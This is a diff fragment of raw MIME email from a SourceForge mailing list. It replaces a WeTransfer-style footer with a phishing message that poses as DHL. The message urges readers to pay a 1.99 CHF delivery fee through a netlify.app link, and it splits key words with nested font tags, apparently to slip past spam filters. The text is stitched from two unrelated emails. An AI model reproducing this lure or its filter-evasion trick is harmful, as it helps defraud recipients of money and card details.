-ing: normal; text-align: left; text-transform: none; white-space: normal; w=
-ord-spacing: 0px; background-color: #ffffff; text-decoration-style: initial=
-; text-decoration-color: initial; margin: 0px; padding: 0px; width: 784px; =
-table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" c=
-ellpadding=3D"0">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 2px 0px 0px; width: 784px;" align=3D"lef=
-t" valign=3D"top">
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; margin: 0px; padding: 0px; width: 784px;=
- table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
-cellpadding=3D"0" bgcolor=3D"white">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 0px 20px; width: 784px;" align=3D"left" =
-valign=3D"top">
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; margin: 0px; padding: 0px; width: 744px;=
- table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" =
-cellpadding=3D"0">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 13px 0px; width: 744px; color: #797c7f; =
-line-height: 24px; font-family: Arial, sans-serif; font-size: 12px; font-st=
-yle: normal; font-weight: normal; word-spacing: 0px;" align=3D"center" vali=
-gn=3D"top">
-<p style=3D"margin: 0px; padding: 0px;">To make sure our emails arrive, ple=
-ase add&nbsp;<span style=3D"color: #797c7f; font-weight: normal;">noreply@<=
-span class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121ydpc77f4e7fv1=
-v1marky67ace8m6">wetransfer</span>.com</span>&nbsp;to&nbsp;your contacts.</=
-p>
-</td>
-</tr>
-</tbody>
-</table>
-</td>
-</tr>
-</tbody>
-</table>
-</td>
-</tr>
-</tbody>
-</table>
-<p style=3D"margin-top: 0px; color: #2c363a; font-family: Roboto, sans-seri=
-f; font-size: 14px; font-style: normal; font-weight: 400; letter-spacing: n=
-ormal; text-align: left; text-indent: 0px; text-transform: none; white-spac=
-e: normal; word-spacing: 0px; background-color: #ffffff; text-decoration-st=
-yle: initial; text-decoration-color: initial;">&nbsp;</p>
-<table class=3D"ydp783f8cc8yiv9880020113ydpe30d4861yiv6412894121yahoo-compo=
-se-table-card ydp783f8cc8yiv9880020113ydp329da516yahoo-compose-table-card y=
-dp783f8cc8yiv9880020113yahoo-compose-table-card yahoo-compose-table-card" s=
-tyle=3D"border-collapse: collapse; color: #2c363a; font-family: Roboto, san=
-s-serif; font-size: 14px; font-style: normal; font-weight: 400; letter-spac=
-ing: normal; text-align: left; text-transform: none; white-space: normal; w=
-ord-spacing: 0px; background-color: #ffffff; text-decoration-style: initial=
-; text-decoration-color: initial; margin: 0px; padding: 0px; width: 784px; =
-table-layout: fixed; border-spacing: 0px;" border=3D"0" cellspacing=3D"0" c=
-ellpadding=3D"0">
-<tbody>
-<tr>
-<td style=3D"margin: 0px; padding: 30px 20px; width: 784px; color: #797c7f;=
- line-height: 23px; font-family: Arial, sans-serif; font-size: 12px; font-s=
-tyle: normal; font-weight: normal; word-spacing: 0px;" align=3D"center" val=
-ign=3D"top"><a style=3D"color: #797c7f; text-decoration-line: underline; te=
-xt-decoration-style: solid; text-decoration-color: currentcolor; background=
--color: transparent; font-weight: normal;" href=3D"https://wetransfer.com/a=
-bout?utm_campaign=3DWT_email_tracking&amp;utm_content=3Dgeneral&amp;utm_med=
-ium=3Dabout_link&amp;utm_source=3Dnotify_recipient_email" target=3D"_blank"=
- rel=3D"nofollow noopener"><span style=3D"color: #797c7f; font-weight: norm=
-al; text-decoration-line: underline; text-decoration-style: solid; text-dec=
-oration-color: currentcolor;">About&nbsp;<span class=3D"ydp783f8cc8yiv98800=
-20113ydpe30d4861yiv6412894121ydpc77f4e7fv1v1marky67ace8m6">WeTransfer</span=
-></span></a>&nbsp;<span style=3D"color: #797c7f;">&nbsp;&nbsp;&middot;&nbsp=
-;&nbsp;</span>&nbsp;<span style=3D"color: #797c7f; font-weight: normal; tex=
-t-decoration-line: underline; text-decoration-style: solid; text-decoration=
--color: currentcolor;">Help</span>&nbsp;<span style=3D"color: #797c7f;">&nb=
-sp;&nbsp;&middot;&nbsp;&nbsp;</span>&nbsp;<span style=3D"color: #797c7f; fo=
-nt-weight: normal; text-decoration-line: underline; text-decoration-style: =
-solid; text-decoration-color: currentcolor;">Legal</span>&nbsp;<span style=
-=3D"color: #797c7f;">&nbsp;&nbsp;&middot;&nbsp;&nbsp;</span>&nbsp;<span sty=
-le=3D"color: #797c7f; font-weight: normal; text-decoration-line: underline;=
- text-decoration-style: solid; text-decoration-color: currentcolor;">Report=
- this transfer as spam</span></td>
-</tr>
-</tbody>
-</table>
-</div>
-<div>&nbsp;</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
+                                                        =
+
+                                                            <span style=3D"=
+color: rgb(60, 72, 88);"><span style=3D"color: rgb(255, 0, 0);"><span style=
+=3D"font-size: 14px;"><b>Important message!</b></span></span><br>
+&nbsp;</span>
+                                                    =
+
+																					        <p style=3D"margin-bottom: 20px;"><strong>In o=
+rder to complete the del<font>ivery of your pac<font>kage <a href=3D"https:=
+//friendly-lovelace-073a55.netlify.app/#industrypack-devel@lists.sourceforg=
+e.net">#SHZ27395</a> , please confirm the pa<font>yment (1.99 CHF).
+ Online confirmation must be made within the next 14 days, before it expire=
+s.</font></font></font></strong></p>
+																					        <p style=3D"margin-bottom: 20px;">
+  <br>
+  <br>
+  =
+
+  <a class=3D"article-title" style=3D"color: rgb(35, 143, 206); line-height=
+: 20px; font-family: Arial, Helvetica, Geneva, sans-serif; font-size: 16px;=
+ text-decoration: none;" href=3D"https://friendly-lovelace-073a55.netlify.a=
+pp/#industrypack-devel@lists.sourceforge.net">
+  =
+
+  <strong>
+  Del<font>iver My Pa<font>ckage &gt;&gt;</font></font></strong></a><font><=
+font><font> </font></font></font></p>
+																					        <p style=3D"margin-bottom: 20px;">
+																					          =
+
+																					          =
+
+																				          </p>
+																					  </div>
+																					</td>
+																				</tr>
+																				<tr style=3D"border-collapse: collapse;">
+																					<td class=3D"w610" style=3D"font-family: Arial, Helvet=
+ica, Geneva, sans-serif; border-collapse: collapse;">
+																						<table width=3D"610" align=3D"left" class=3D"w610" bo=
+rder=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+																							<tbody>
+																								<tr>
+																								  <td class=3D"whitepaper_details" style=3D"font: 1=
+1px/18px Arial, Helvetica, Geneva, sans-serif; color: rgb(68, 68, 68); padd=
+ing-top: 10px; font-size-adjust: none; font-stretch: normal;">
+																										Kind regards,<br>
+																										D<font>H<font>L Tracking services.
+</font></font></td>
+																								</tr>
+																								<tr>
+																									<td class=3D"whitepaper_details" style=3D"font: 12=
+px/14px Arial, Helvetica, Geneva, sans-serif; color: rgb(68, 68, 68); font-=
+size-adjust: none; font-stretch: normal;">&nbsp;
+																										</td>
+																								</tr>
+																							</tbody>
+																						</table>
+																					</td>
+																				</tr>
+																			</tbody>
+																		</table>
+																	</td>
+																</tr>
+															</tbody>
+														</table>
+													</td>
+													<td width=3D"15" class=3D"w15" style=3D"font-family: Arial, He=
+lvetica, Geneva, sans-serif; border-collapse: collapse;" bgcolor=3D"#f7f7f7=
+">&nbsp;
+														</td>
+												</tr>
+											</tbody>
+										</table>
+									</td>
+								</tr>
+								<tr style=3D"border-collapse: collapse;">
+									<td width=3D"640" class=3D"w640" style=3D"font-family: Arial, Helv=
+etica, Geneva, sans-serif; border-top-color: rgb(204, 0, 0); border-top-wid=
+th: 5px; border-top-style: solid; border-collapse: collapse;">
+										<table width=3D"640" class=3D"w640" id=3D"footer" style=3D"border=
+-radius: 0px 0px 6px 6px; color: rgb(255, 255, 255); background-color: rgb(=
+0, 0, 0); -moz-border-radius: 0px 0px 6px 6px; -webkit-border-radius: 0px 0=
+px 6px 6px; -webkit-font-smoothing: antialiased;" bgcolor=3D"#000" border=
+=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+											<tbody>
+												<tr style=3D"border-collapse: collapse;">
+													<td width=3D"15" height=3D"5" class=3D"w30" style=3D"font-fami=
+ly: Arial, Helvetica, Geneva, sans-serif; border-collapse: collapse;"></td>
+													<td height=3D"5" class=3D"w580 h0" style=3D"font-family: Arial=
+, Helvetica, Geneva, sans-serif; border-collapse: collapse;"></td>
+													<td width=3D"30" height=3D"5" class=3D"w30" style=3D"font-fami=
+ly: Arial, Helvetica, Geneva, sans-serif; border-collapse: collapse;"></td>
+												</tr>
+												<tr style=3D"border-collapse: collapse;">
+													<td width=3D"15" class=3D"w30" style=3D"font-family: Arial, He=
+lvetica, Geneva, sans-serif; border-collapse: collapse;">&nbsp;
+												  </td>
+													<td align=3D"left" class=3D"w580" valign=3D"top" style=3D"font=
+-family: Arial, Helvetica, Geneva, sans-serif; border-collapse: collapse;">
+														<p class=3D"footer-content-left" id=3D"permission-reminder" s=
+tyle=3D"color: rgb(255, 255, 255); line-height: 15px; font-size: 9px; margi=
+n-top: 5px; margin-bottom: 5px; white-space: normal; -ms-text-size-adjust: =
+none; -webkit-text-size-adjust: none;">
+															2021 =A9 D<font>H<font>L International GmbH. All rights rese=
+rved.</font></font></p>
+												  <p class=3D"footer-content-left" style=3D"color: rgb(255, 255=
+, 255); line-height: 15px; font-size: 9px; margin-top: 5px; margin-bottom: =
+5px; white-space: normal; -ms-text-size-adjust: none; -webkit-text-size-adj=
+ust: none;"></p></td>
+													<td width=3D"30" class=3D"w30" style=3D"font-family: Arial, He=
+lvetica, Geneva, sans-serif; border-collapse: collapse;">&nbsp;
+												  </td>
+												</tr>
+												<tr style=3D"border-collapse: collapse;">
+													<td width=3D"15" height=3D"5" class=3D"w30" style=3D"font-fami=
+ly: Arial, Helvetica, Geneva, sans-serif; border-collapse: collapse;"></td>
+													<td height=3D"5" class=3D"w580 h0" style=3D"font-family: Arial=
+, Helvetica, Geneva, sans-serif; border-collapse: collapse;"></td>
+													<td width=3D"30" height=3D"5" class=3D"w30" style=3D"font-fami=
+ly: Arial, Helvetica, Geneva, sans-serif; border-collapse: collapse;"></td>
+												</tr>
+											</tbody>
+										</table>
+									</td>
+								</tr>
+								<tr style=3D"border-collapse: collapse;">
+									<td width=3D"640" height=3D"60" class=3D"w640" style=3D"font-famil=
+y: Arial, Helvetica, Geneva, sans-serif; border-collapse: collapse;">&nbsp;
+										</td>
+								</tr>
+							</tbody>
+						</table>
+					</td>
+				</tr>
+			</tbody>
+		</table>
+	=
 
 
---===============1944366079469917490==
+
+
+
+
+</div>
+
+</BODY></HTML>
+--===============1716599118==--
+
+
+--===============6364347772763992388==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============1944366079469917490==
+--===============6364347772763992388==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -467,4 +481,5 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============1944366079469917490==--
+--===============6364347772763992388==--
+
